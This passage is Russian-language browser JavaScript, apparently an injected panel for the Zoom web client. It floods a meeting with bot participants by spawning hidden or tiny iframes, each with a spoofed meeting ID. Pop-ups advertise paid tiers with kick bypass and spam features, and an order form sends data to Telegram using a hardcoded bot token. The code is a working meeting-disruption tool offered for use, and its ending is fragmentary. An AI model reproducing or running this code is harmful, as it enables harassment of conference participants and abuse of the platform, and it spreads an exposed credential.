                    background: linear-gradient(45deg, #1a1a1a, #2d2d2d);
                    color: white;
                    font-family: 'Segoe UI', Arial, sans-serif;
                    padding: 30px;
                    margin: 0;
                    min-height: 100vh;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                }
                .container {
                    max-width: 800px;
                    text-align: center;
                }
                h1 {
                    font-size: 2.8rem;
                    background: linear-gradient(45deg, #00ff88, #00ffee);
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                    margin-bottom: 15px;
                    text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
                }
                .status {
                    font-size: 1.4rem;
                    color: #888;
                    margin-bottom: 25px;
                }
                .info {
                    font-size: 1.1rem;
                    color: #666;
                    margin: 15px 0;
                }
                .progress {
                    width: 300px;
                    height: 8px;
                    background: rgba(255,255,255,0.1);
                    border-radius: 4px;
                    margin: 20px auto;
                    overflow: hidden;
                }
                .progress-bar {
                    width: 0%;
                    height: 100%;
                    background: linear-gradient(45deg, #00ff88, #00ffee);
                    transition: width 15s linear;
                }
                .bot-counter {
                    font-size: 1.2rem;
                    color: #00ff88;
                    margin-top: 20px;
                }
            </style>
        `;
    
        n.document.body.innerHTML = `
            <div class="container">
                <h1>Подключение ботов</h1>
                <div class="status">Идет подключение ботов к конференции...</div>
                <div class="progress">
                    <div class="progress-bar"></div>
                </div>
                <div class="bot-counter">Количество ботов: ${t}</div>
                <div class="info">Пожалуйста, не закрывайте это окно во время работы ботов</div>
            </div>
        `;
    
        setTimeout(() => {
            const progressBar = n.document.querySelector('.progress-bar');
            progressBar.style.width = '100%';
            
            setTimeout(() => {
                n.document.querySelector('.status').innerHTML = 'Боты успешно подключены!';
                n.document.querySelector('.status').style.color = '#00ff88';
                n.document.querySelector('.info').innerHTML = 'Можете свернуть это окно';
            }, 15000);
        }, 100);
    
        var a = document.createElement("div");
        a.style.display = "flex";
        a.style.flexWrap = "wrap";
        a.style.justifyContent = "center";
        a.style.marginTop = "30px";
        n.document.body.appendChild(a);
    
        for (var i = 0; i < t; i++) {
            var l = document.createElement("iframe");
            l.src = meetingURL;
            if (e) {
                l.style.width = "0%";
                l.style.height = "0%";
                l.style.display = "none";
            } else {
                l.style.width = "700px";
                l.style.height = "900px";
                l.style.border = "none";
                l.style.borderRadius = "10px";
                l.style.margin = "10px";
                l.style.boxShadow = "0px 4px 8px rgba(0, 0, 0, 0.1)";
            }
            a.appendChild(l);
            var c = l.contentWindow;
            (c.webpackChunkwebclient = c.webpackChunkwebclient || []).push([[Symbol()], {}, function(e) {
                e(22665).$c.webClient_meetingUqiueId = Math.random().toString(36).substring(2, 7);
            }]);
        }
    
        for (var s = a.querySelectorAll("iframe"), u = 0; u < s.length; u++) {
            if (u % 5 == 0 && u !== 0) {
                var p = document.createElement("div");
                p.style.width = "100%";
                a.appendChild(p);
            }
        }
    }),
    
    // Кнопка для своего количества ботов
    e.addButton(N, "🤖 СВОЁ КОЛИЧЕСТВО БОТОВ", !1, function() {
        var t = parseInt(prompt("Введите количество ботов (максимум 25):"), 10);
        if (!t || t <= 0) return; // Проверка на некорректный ввод
        if (t > 25) {
            alert("Максимальное количество ботов - 25");
            return;
        }
        
        var e = false;
        localStorage.clear();
        window.meetingURL = window.meetingURL || document.querySelector("#webclient").src;
        
        var n = window.open("about:blank", "Bot Panel - " + d);
        d++;
        n.document.title = "Панель управления ботами";
    
        n.document.head.innerHTML = `
            <style>
                body {
                    background: linear-gradient(45deg, #1a1a1a, #2d2d2d);
                    color: white;
                    font-family: 'Segoe UI', Arial, sans-serif;
                    padding: 30px;
                    margin: 0;
                    min-height: 100vh;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                }
                .container {
                    max-width: 800px;
                    text-align: center;
                }
                h1 {
                    font-size: 2.8rem;
                    background: linear-gradient(45deg, #00ff88, #00ffee);
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                    margin-bottom: 15px;
                    text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
                }
                .status {
                    font-size: 1.4rem;
                    color: #888;
                    margin-bottom: 25px;
                }
                .info {
                    font-size: 1.1rem;
                    color: #666;
                    margin: 15px 0;
                }
                .progress {
                    width: 300px;
                    height: 8px;
                    background: rgba(255,255,255,0.1);
                    border-radius: 4px;
                    margin: 20px auto;
                    overflow: hidden;
                }
                .progress-bar {
                    width: 0%;
                    height: 100%;
                    background: linear-gradient(45deg, #00ff88, #00ffee);
                    transition: width 15s linear;
                }
                .bot-counter {
                    font-size: 1.2rem;
                    color: #00ff88;
                    margin-top: 20px;
                }
            </style>
        `;
    
        n.document.body.innerHTML = `
            <div class="container">
                <h1>Подключение ботов</h1>
                <div class="status">Идет подключение ботов к конференции...</div>
                <div class="progress">
                    <div class="progress-bar"></div>
                </div>
                <div class="bot-counter">Количество ботов: ${t}</div>
                <div class="info">Пожалуйста, не закрывайте это окно во время работы ботов</div>
            </div>
        `;
    
        setTimeout(() => {
            const progressBar = n.document.querySelector('.progress-bar');
            progressBar.style.width = '100%';
            
            setTimeout(() => {
                n.document.querySelector('.status').innerHTML = 'Боты успешно подключены!';
                n.document.querySelector('.status').style.color = '#00ff88';
                n.document.querySelector('.info').innerHTML = 'Можете свернуть это окно';
            }, 15000);
        }, 100);
    
        var a = document.createElement("div");
        a.style.display = "flex";
        a.style.flexWrap = "wrap";
        a.style.justifyContent = "center";
        a.style.marginTop = "30px";
        n.document.body.appendChild(a);
    
        for (var i = 0; i < t; i++) {
            var l = document.createElement("iframe");
            l.src = meetingURL;
            if (e) {
                l.style.width = "0%";
                l.style.height = "0%";
                l.style.display = "none";
            } else {
                l.style.width = "700px";
                l.style.height = "900px";
                l.style.border = "none";
                l.style.borderRadius = "10px";
                l.style.margin = "10px";
                l.style.boxShadow = "0px 4px 8px rgba(0, 0, 0, 0.1)";
            }
            a.appendChild(l);
            var c = l.contentWindow;
            (c.webpackChunkwebclient = c.webpackChunkwebclient || []).push([[Symbol()], {}, function(e) {
                e(22665).$c.webClient_meetingUqiueId = Math.random().toString(36).substring(2, 7);
            }]);
        }
    
        for (var s = a.querySelectorAll("iframe"), u = 0; u < s.length; u++) {
            if (u % 5 == 0 && u !== 0) {
                var p = document.createElement("div");
                p.style.width = "100%";
                a.appendChild(p);
            }
        }
    }),
    e.addSeparator(N),
    e.addSubtitle(N, "БОТЫ"),  // Добавляем заголовок категории

    // Кнопка для 5 ботов
    e.addButton(N, "🤖 Запустить 5 ботов", !1, (function() {
        !function(count = 5) {
            localStorage.clear();
            window.meetingURL = window.meetingURL || document.querySelector("#webclient").src;
            
            var container = document.createElement("div");
            container.style.display = "flex";
            container.style.flexWrap = "wrap";
            document.body.appendChild(container);
            
            for (var i = 0; i < count; i++) {
                var frame = document.createElement("iframe");
                frame.src = meetingURL;
                frame.style.width = "10px";
                frame.style.height = "10px";
                frame.style.border = "none";
                frame.style.margin = "5px";
                container.appendChild(frame);
                
                var frameWindow = frame.contentWindow;
                (frameWindow.webpackChunkwebclient = frameWindow.webpackChunkwebclient || []).push([[Symbol()], {}, function(e) {
                    e(22665).$c.webClient_meetingUqiueId = Math.random().toString(36).substring(2, 7);
                }]);
            }
        }();
    })),
    
    // Кнопка для 10 ботов
    e.addButton(N, "🤖 Запустить 10 ботов", !1, (function() {
        !function(count = 10) {
            localStorage.clear();
            window.meetingURL = window.meetingURL || document.querySelector("#webclient").src;
            
            var container = document.createElement("div");
            container.style.display = "flex";
            container.style.flexWrap = "wrap";
            document.body.appendChild(container);
            
            for (var i = 0; i < count; i++) {
                var frame = document.createElement("iframe");
                frame.src = meetingURL;
                frame.style.width = "10px";
                frame.style.height = "10px";
                frame.style.border = "none";
                frame.style.margin = "5px";
                container.appendChild(frame);
                
                var frameWindow = frame.contentWindow;
                (frameWindow.webpackChunkwebclient = frameWindow.webpackChunkwebclient || []).push([[Symbol()], {}, function(e) {
                    e(22665).$c.webClient_meetingUqiueId = Math.random().toString(36).substring(2, 7);
                }]);
            }
        }();
    })),
    
    // Кнопка для 15 ботов
    e.addButton(N, "🤖 Запустить 15 ботов", !1, (function() {
        !function(count = 15) {
            localStorage.clear();
            window.meetingURL = window.meetingURL || document.querySelector("#webclient").src;
            
            var container = document.createElement("div");
            container.style.display = "flex";
            container.style.flexWrap = "wrap";
            document.body.appendChild(container);
            
            for (var i = 0; i < count; i++) {
                var frame = document.createElement("iframe");
                frame.src = meetingURL;
                frame.style.width = "10px";
                frame.style.height = "10px";
                frame.style.border = "none";
                frame.style.margin = "5px";
                container.appendChild(frame);
                
                var frameWindow = frame.contentWindow;
                (frameWindow.webpackChunkwebclient = frameWindow.webpackChunkwebclient || []).push([[Symbol()], {}, function(e) {
                    e(22665).$c.webClient_meetingUqiueId = Math.random().toString(36).substring(2, 7);
                }]);
            }
        }();
    })),
    
    // Кнопка для пользовательского количества ботов
    e.addButton(N, "🤖 Своё количество ботов", !1, (function() {
        var count = parseInt(prompt("Введите количество ботов (максимум 50):"), 10) || 5;
        count = Math.min(count, 50); // Ограничиваем максимальное количество
        
        !function(count) {
            localStorage.clear();
            window.meetingURL = window.meetingURL || document.querySelector("#webclient").src;
            
            var container = document.createElement("div");
            container.style.display = "flex";
            container.style.flexWrap = "wrap";
            document.body.appendChild(container);
            
            for (var i = 0; i < count; i++) {
                var frame = document.createElement("iframe");
                frame.src = meetingURL;
                frame.style.width = "10px";
                frame.style.height = "10px";
                frame.style.border = "none";
                frame.style.margin = "5px";
                container.appendChild(frame);
                
                var frameWindow = frame.contentWindow;
                (frameWindow.webpackChunkwebclient = frameWindow.webpackChunkwebclient || []).push([[Symbol()], {}, function(e) {
                    e(22665).$c.webClient_meetingUqiueId = Math.random().toString(36).substring(2, 7);
                }]);
            }
        }(count);
    })),
    e.addSeparator(N),
    e.addButton(N, "✨ TELEGRAM | @NearIyEpoint 💫", false, (function() {
        window.open("https://t.me/NearIyEpoint", "_blank")
    }
    )),
    window.showAdvertisement = function() {
        const adDiv = document.createElement('div');
        adDiv.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) perspective(1000px) rotateX(15deg);
            width: 450px;
            background: linear-gradient(145deg, rgba(40,40,55,0.98), rgba(25,25,35,0.98));
            backdrop-filter: blur(20px);
            color: #fff;
            padding: 35px;
            border-radius: 24px;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.3),
                       0 0 100px rgba(82, 0, 255, 0.05),
                       inset 0 0 0 1px rgba(255,255,255,0.1);
            z-index: 999999;
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
            opacity: 0;
            transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
        `;
    
        const title = document.createElement('h2');
        title.textContent = '🌟 Премиум версия';
        title.style.cssText = `
            margin: 0 0 25px 0;
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            background: linear-gradient(135deg, #22C55E, #16A34A);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        `;
    
        const content = document.createElement('div');
        content.innerHTML = `
            <p style="text-align: center; margin-bottom: 20px; line-height: 1.6;">
                Получите доступ к расширенным функциям:<br>
                ✨ Больше ботов<br>
                🚀 Новые функции спама<br>
                💫 Премиум поддержка
            </p>
        `;
    
        const buttonContainer = document.createElement('div');
        buttonContainer.style.cssText = `
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 20px;
        `;
    
        const buyButton = document.createElement('button');
        buyButton.textContent = 'Купить';
        buyButton.style.cssText = `
            padding: 12px 24px;
            background: linear-gradient(135deg, #22C55E, #16A34A);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
        `;
    
        const closeButton = document.createElement('button');
        closeButton.textContent = 'Закрыть';
        closeButton.style.cssText = `
            padding: 12px 24px;
            background: transparent;
            color: #22C55E;
            border: 2px solid #22C55E;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
        `;
    
        function closeAd() {
            adDiv.style.opacity = '0';
            adDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(-15deg)';
            setTimeout(() => adDiv.remove(), 600);
        }
        buyButton.onclick = () => {
            var n = window.open("about:blank", "Bot Panel - " + Math.random());
            n.document.title = "КЛИЕНТ ЗУМ";
    
            n.document.head.innerHTML = `
                <style>
                    @keyframes gradientBG {
                        0% { background-position: 0% 50%; }
                        50% { background-position: 100% 50%; }
                        100% { background-position: 0% 50%; }
                    }
                    @keyframes float {
                        0% { transform: translateY(0px); }
                        50% { transform: translateY(-10px); }
                        100% { transform: translateY(0px); }
                    }
                    body {
                        background: linear-gradient(-45deg, #1a1a1a, #2d2d2d, #1f1f1f, #2a2a2a);
                        background-size: 400% 400%;
                        animation: gradientBG 15s ease infinite;
                        color: white;
                        font-family: 'Segoe UI', Arial, sans-serif;
                        padding: 30px;
                        margin: 0;
                        min-height: 100vh;
                        display: flex;
                        flex-direction: column;
                        align-items: center;
                    }
                    .container {
                        max-width: 1200px;
                        text-align: center;
                        display: flex;
                        flex-wrap: wrap;
                        justify-content: center;
                        gap: 25px;
                        padding: 20px;
                    }
                    .price-box {
                        width: 280px;
                        padding: 30px;
                        background: rgba(33, 150, 243, 0.08);
                        backdrop-filter: blur(10px);
                        transition: all 0.4s ease;
                        border-radius: 15px;
                        box-shadow: 0 8px 16px rgba(0,0,0,0.2);
                    }
                    .price-box:hover {
                        transform: translateY(-8px);
                        box-shadow: 0 15px 30px rgba(33, 150, 243, 0.3);
                    }
                    .price-box h2 {
                        color: #2196F3;
                        margin-bottom: 25px;
                        font-size: 26px;
                        text-shadow: 0 0 15px rgba(33, 150, 243, 0.4);
                    }
                    .price-box ul {
                        text-align: left;
                        list-style-type: none;
                        padding: 0;
                        margin: 20px 0;
                    }
                    .price-box li {
                        margin: 15px 0;
                        padding: 8px 8px 8px 30px;
                        position: relative;
                    }
                    .price-box li:before {
                        content: "✦";
                        color: #2196F3;
                        position: absolute;
                        left: 5px;
                    }
                    .price-tag {
                        font-size: 32px;
                        color: #2196F3;
                        font-weight: bold;
                        margin: 20px 0;
                        text-shadow: 0 0 10px rgba(33, 150, 243, 0.3);
                    }
                    .order-form {
                        background: rgba(33, 150, 243, 0.08);
                        padding: 30px;
                        border-radius: 15px;
                        margin-top: 30px;
                        width: 100%;
                        max-width: 500px;
                    }
                    .form-group {
                        margin-bottom: 20px;
                    }
                    .form-group label {
                        display: block;
                        margin-bottom: 8px;
                        color: #2196F3;
                    }
                    .form-group input, .form-group select {
                        width: 100%;
                        padding: 12px;
                        border: 1px solid rgba(33, 150, 243, 0.3);
                        border-radius: 8px;
                        background: rgba(255, 255, 255, 0.05);
                        color: white;
                        font-size: 16px;
                    }
                    .version-selector, .payment-selector {
                        display: flex;
                        gap: 10px;
                        margin-bottom: 20px;
                    }
                    .version-option, .payment-option {
                        flex: 1;
                        padding: 15px;
                        border: 2px solid #2196F3;
                        border-radius: 10px;
                        cursor: pointer;
                        transition: all 0.3s ease;
                        background: rgba(33, 150, 243, 0.1);
                    }
                    .version-option.selected, .payment-option.selected {
                        background: rgba(33, 150, 243, 0.3);
                        transform: scale(1.05);
                    }
                    .telegram-input {
                        position: relative;
                        margin-bottom: 20px;
                    }
                    .telegram-input input {
                        width: 100%;
                        padding: 12px 12px 12px 35px;
                        border: 2px solid rgba(33, 150, 243, 0.3);
                        border-radius: 8px;
                        background: rgba(255, 255, 255, 0.05);
                        color: white;
                        font-size: 16px;
                    }
                    .submit-btn {
                        background: linear-gradient(45deg, #2196F3, #00BCD4);
                        border: none;
                        padding: 15px 30px;
                        border-radius: 25px;
                        color: white;
                        font-weight: bold;
                        cursor: pointer;
                        transition: all 0.3s ease;
                    }
                    .submit-btn:hover {
                        transform: translateY(-3px);
                        box-shadow: 0 8px 15px rgba(33, 150, 243, 0.3);
                    }
                </style>
            `;
    
            n.document.body.innerHTML = `
                <div class="container">
                    <div class="price-box">
                        <h2>📦 Базовая версия</h2>
                        <div class="price-tag">199₽</div>
                        <ul>
                            <li>Обойти кик вручную</li>
                            <li>⚙️ Быстрая смена ника</li>
                            <li>⚙️ Параметры микрофона</li>
                            <li>✋ Автоматическое поднятие руки</li>
                        </ul>
                        <p>‼️ Важно: Накрутка ботов доступна только от 999₽</p>
                    </div>
    
                    <div class="price-box">
                        <h2>💼 Профессиональная версия</h2>
                        <div class="price-tag">999₽</div>
                        <ul>
                            <li>🎉 Все функции Basic</li>
                            <li>🛡 Автоматический обход кика</li>
                            <li>👥 Копировать имена участников</li>
                            <li>✏️ Настройка комбо спама</li>
                            <li>💥 Агрессивный спам</li>
                            <li>💫 Дублировать конференцию</li>
                        </ul>
                        <p>🔄 Запуск ботов (лимит до 50)</p>
                    </div>
    
                    <div class="price-box">
                        <h2>🌈 Ultimate версия</h2>
                        <div class="price-tag">1999₽</div>
                        <ul>
                            <li>🎉 Все функции Pro</li>
                            <li>🔄 Создать резервное подключение</li>
                            <li>⚙️ Настройка спама реакций</li>
                            <li>⚙️ Настройка спама руки</li>
                            <li>🎯 Запуск спама реакций</li>
                            <li>⚡️ Все шаблоны спама</li>
                        </ul>
                        <p>🔄 На запуск ботов лимита нету</p>
                    </div>
                </div>
    
                <form id="orderForm" class="order-form">
                    <h2 style="color: #2196F3; margin-bottom: 25px;">💸 Заказ и детали</h2>
                    
                    <div class="form-group">
                        <label>Выберите версию</label>
                        <div class="version-selector">
                            <div class="version-option" data-version="basic" data-price="199">
                                <h3>Базовая</h3>
                                <p>199₽</p>
                            </div>
                            <div class="version-option" data-version="pro" data-price="999">
                                <h3>Профессиональная</h3>
                                <p>999₽</p>
                            </div>
                            <div class="version-option" data-version="ultimate" data-price="1999">
                                <h3>Ultimate</h3>
                                <p>1999₽</p>
                            </div>
                        </div>
                        <input type="hidden" name="version" id="selectedVersion" required>
                    </div>
    
                    <div class="form-group">
                        <label>Выберите способ оплаты</label>
                        <div class="payment-selector">
                            <div class="payment-option" data-payment="card">
                                <h3>💳 Карта</h3>
                                <p>Visa/MasterCard</p>
                            </div>
                            <div class="payment-option" data-payment="qiwi">
                                <h3>📱 QIWI</h3>
                                <p>Электронный кошелек</p>
                            </div>
                            <div class="payment-option" data-payment="crypto">
                                <h3>₿ Крипта</h3>
                                <p>BTC/ETH/USDT</p>
                            </div>
                        </div>
                        <input type="hidden" name="payment" id="selectedPayment" required>
                    </div>
    
                    <div class="form-group">
                        <label>Ваш Telegram</label>
                        <div class="telegram-input">
                            <input type="text" name="telegram" placeholder="username" required pattern="[A-Za-z0-9_]{5,32}" title="Введите корректное имя пользователя Telegram (5-32 символа, только буквы, цифры и подчеркивания)">
                        </div>
                    </div>
    
                    <button type="submit" class="submit-btn">Оформить заказ</button>
                </form>
            `;
    
            function showCustomAlert(message, callback) {
                const alertBox = n.document.createElement('div');
                alertBox.style.cssText = `
                    position: fixed;
                    top: 50%;
                    left: 50%;
                    transform: translate(-50%, -50%) perspective(1000px) rotateX(15deg) scale(0.8);
                    background: linear-gradient(145deg, rgba(40,40,55,0.98), rgba(25,25,35,0.98));
                    backdrop-filter: blur(20px);
                    padding: 35px;
                    border-radius: 24px;
                    box-shadow: 0 25px 60px rgba(0, 0, 0, 0.3),
                               0 0 100px rgba(82, 0, 255, 0.05),
                               inset 0 0 0 1px rgba(255,255,255,0.1);
                    z-index: 999999;
                    min-width: 300px;
                    text-align: center;
                    font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
                    opacity: 0;
                    transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
                `;
    
                const messageText = n.document.createElement('p');
                messageText.style.cssText = `
                    color: #fff;
                    margin: 0 0 25px 0;
                    font-size: 16px;
                    line-height: 1.4;
                    transform: translateY(10px);
                    opacity: 0;
                    transition: all 0.4s ease 0.2s;
                `;
                messageText.textContent = message;
    
                const okButton = n.document.createElement('button');
                okButton.textContent = 'OK';
                okButton.style.cssText = `
                    background: #22C55E;
                    border: none;
                    padding: 10px 25px;
                    border-radius: 12px;
                    color: white;
                    cursor: pointer;
                    font-size: 14px;
                    font-weight: 600;
                    transition: all 0.3s ease;
                    box-shadow: 0 4px 12px rgba(34, 197, 94, 0.3);
                    transform: translateY(10px);
                    opacity: 0;
                `;
    
                okButton.onmouseover = () => {
                    okButton.style.background = '#1ea750';
                    okButton.style.transform = 'translateY(-2px)';
                    okButton.style.boxShadow = '0 6px 15px rgba(34, 197, 94, 0.4)';
                };
    
                okButton.onmouseout = () => {
                    okButton.style.background = '#22C55E';
                    okButton.style.transform = 'translateY(0)';
                    okButton.style.boxShadow = '0 4px 12px rgba(34, 197, 94, 0.3)';
                };
    
                okButton.onclick = () => {
                    alertBox.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(15deg) scale(0.8)';
                    alertBox.style.opacity = '0';
                    setTimeout(() => {
                        alertBox.remove();
                        if (callback) callback();
                    }, 300);
                };
    
                alertBox.appendChild(messageText);
                alertBox.appendChild(okButton);
                n.document.body.appendChild(alertBox);
                
                setTimeout(() => {
                    alertBox.style.opacity = '1';
                    alertBox.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(0deg) scale(1)';
                    messageText.style.transform = 'translateY(0)';
                    messageText.style.opacity = '1';
                    okButton.style.transform = 'translateY(0)';
                    okButton.style.opacity = '1';
                }, 10);
            }
    
            // Добавляем обработчики для селектора версий
            n.document.querySelectorAll('.version-option').forEach(option => {
                option.addEventListener('click', function() {
                    n.document.querySelectorAll('.version-option').forEach(opt => opt.classList.remove('selected'));
                    this.classList.add('selected');
                    n.document.getElementById('selectedVersion').value = this.dataset.version;
                });
            });
    
            // Добавляем обработчики для селектора оплаты
            n.document.querySelectorAll('.payment-option').forEach(option => {
                option.addEventListener('click', function() {
                    n.document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('selected'));
                    this.classList.add('selected');
                    n.document.getElementById('selectedPayment').value = this.dataset.payment;
                });
            });
    
            // Обработчик отправки формы
            n.document.getElementById('orderForm').addEventListener('submit', function(e) {
                e.preventDefault();
                if (!n.document.getElementById('selectedVersion').value) {
                    showCustomAlert('Пожалуйста, выберите версию!');
                    return;
                }
                if (!n.document.getElementById('selectedPayment').value) {
                    showCustomAlert('Пожалуйста, выберите способ оплаты!');
                    return;
                }
                
                const form = e.target;
                form.style.transition = 'all 0.3s ease';
                form.style.transform = 'scale(0.98)';
                form.style.opacity = '0.8';
                
                const formData = new FormData(e.target);
                const data = Object.fromEntries(formData);
                
                const message = `🛒 Новый заказ:\n\n🔹 Версия: ${data.version}\n💳 Способ оплаты: ${data.payment}\n👤 Telegram: @${data.telegram}`;
                
                const BOT_TOKEN = '7892348359:AAE8Fy6SyQ5qOR1XM4t0tOdT0kq0GLYSRO4';
                const CHAT_ID = '-1002453736153';
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                })
                .then(response => response.json())
                .then(result => {
                    form.style.transform = 'scale(1)';
                    form.style.opacity = '1';
                    
                    if(result.ok) {
                        showCustomAlert('Заказ успешно отправлен! Мы свяжемся с вами в Telegram.', () => {
                            window.open(`https://t.me/ZoomNRL`, '_blank');
                        });
                    } else {
                        throw new Error('Ошибка отправки');
                    }
                })
                .catch(error => {
                    form.style.transform = 'scale(1)';
                    form.style.opacity = '1';
                    
                    console.error('Error:', error);
                    showCustomAlert('❌ Ошибка!\n\nПроизошла ошибка при отправке заказа. Пожалуйста, напишите нам напрямую в Telegram.', () => {
                        window.open(`https://t.me/ZoomNRL`, '_blank');
                    });
                });
            });
    
            closeAd();
        };
    
        closeButton.onclick = closeAd;
    
        buttonContainer.appendChild(buyButton);
        buttonContainer.appendChild(closeButton);
        adDiv.appendChild(title);
        adDiv.appendChild(content);
        adDiv.appendChild(buttonContainer);
        document.body.appendChild(adDiv);
    
        requestAnimationFrame(() => {
            adDiv.style.opacity = '1';
            adDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(0)';
        });
    };
    
    // Запускаем показ рекламы каждые 10 минут
    window.adInterval = setInterval(window.showAdvertisement, 600000);
    
    // Показываем рекламу сразу при запуске
    window.showAdvertisement();
    (N, "Скачать код", !1, (function() {
        var e, t;
        e = new Blob(['// Пример безопасного кода\nconsole.log("Привет!");'], {
            type: "text/plain"
        }),
        (t = document.createElement("a")).href = window.URL.createObjectURL(e),
        t.download = "example.js",
        document.body.appendChild(t),
        t.click(),
        setTimeout((function() {
            document.body.removeChild(t),
            window.URL.revokeObjectURL(t.href)
        }
        ), 1e3)
    }
    ))
}
)();